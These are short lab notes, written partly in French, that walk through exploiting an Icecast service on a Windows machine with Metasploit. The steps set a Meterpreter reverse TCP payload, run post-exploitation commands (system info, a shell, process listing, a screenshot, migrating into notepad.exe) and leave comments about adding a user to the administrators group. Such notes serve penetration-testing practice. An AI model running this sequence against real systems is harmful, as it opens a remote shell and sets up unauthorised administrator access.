# lab  

## run icecast en admin sur le windows


	smfconsole  
	search icecast  
	use exploit/xx 
	set payload windows/meterpreter/reverse_tcp  
	set rhost  xx
	set lhost  xx
	
	sysinfo  
	getuid  
	ps  
	
	shell
	#add user
	#add user on admin group 
	net localgroup administrators
	
	screenshot -p /tmp/screen/jpg
	
	getpid
	ps -S notepad.exe
	migrate <id>
	get pid
